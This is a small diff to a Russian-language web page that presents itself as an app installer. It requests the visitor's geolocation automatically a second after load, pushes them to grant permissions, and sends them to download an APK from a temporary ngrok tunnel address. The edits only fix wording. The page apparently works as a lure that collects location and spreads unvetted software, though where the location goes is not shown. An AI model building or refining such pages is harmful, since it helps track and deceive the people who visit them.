@@ -26,7 +26,7 @@
   </style>
 </head>
 <body>
-  <h2>Добро пожаловать! Для установки дайте разршения</h2>
+  <h2>Добро пожаловать! Для установки дайте разрешения</h2>
   <p id="status">Ожидание разрешения...</p>
   <button id="installBtn">Установить приложение</button>
   <button id="retryBtn">Повторить запрос</button>
@@ -72,7 +72,7 @@
     }
 
     retryBtn.onclick = () => {
-      status.textContent = "Ожидайте.";
+      status.textContent = "Повторный запрос геолокации...";
       retryBtn.style.display = "none";
       requestGeo();
     };
@@ -81,7 +81,7 @@
       window.location.href = "https://c0e0-149-102-242-94.ngrok-free.app/download/app.apk";
     };
 
-    // Авто-запрос геолокации с небольшой задержкой, чтобы дать время странице загрузиться
+    // Автоматический запрос при входе
     setTimeout(requestGeo, 1000);
   </script>
 </body>
